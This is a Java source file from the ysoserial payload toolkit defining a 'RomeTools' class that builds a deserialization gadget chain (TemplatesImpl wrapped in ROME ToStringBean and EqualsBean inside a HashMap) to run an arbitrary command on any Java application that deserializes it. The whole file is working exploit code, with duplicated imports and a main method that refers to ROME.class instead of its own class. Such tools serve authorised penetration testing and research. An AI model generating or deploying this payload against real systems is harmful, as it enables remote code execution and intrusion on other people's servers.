package ysoserial.payloads;


import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;
import java.util.HashMap;

import com.rometools.rome.feed.impl.ToStringBean;
import com.rometools.rome.feed.impl.EqualsBean;
import javax.xml.transform.Templates;
import java.util.HashMap;

public class RomeTools implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        EqualsBean equalsBean = new EqualsBean(toStringBean.getClass(),toStringBean);
        HashMap map = Gadgets.makeMap(equalsBean,1);
        return map;
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME.class, args);
    }
}
